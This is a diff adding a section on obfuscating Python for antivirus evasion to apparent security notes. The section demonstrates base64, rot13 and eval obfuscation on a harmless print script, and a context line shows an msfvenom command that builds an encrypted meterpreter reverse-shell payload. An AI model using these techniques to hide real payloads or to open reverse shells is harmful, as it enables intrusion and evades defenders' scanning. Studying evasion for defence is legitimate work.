@@ -228,5 +228,28 @@ $ msfvenom -p windows/meterpreter/reverse_tcp LHOST=127.0.0.1 --encrypt rc4 --en
 
 Although antivirus isn’t good at scanning encrypted shellcode statically, run-time monitoring is still a strong line of defense. It is easy to get caught after you decrypt and execute it.
 
+## Obfuscated Python for Evasion:
 
+Resource: ```https://development-tools.net/python-obfuscator/```
 
+Example Script:
+
+```
+#!/usr/bin/env python3
+print("Gotcha!")
+```
+
+Results:
+
+```
+# Python code obfuscated by www.development-tools.net 
+ 
+import base64, codecs
+magic = 'IyEvdXNyL2Jpbi'
+love = '9yoaLtpUy0nT9h'
+god = 'MwpwcmludCgiR2'
+destiny = '90L2uuVFVcPt=='
+joy = '\x72\x6f\x74\x31\x33'
+trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
+eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))
+```
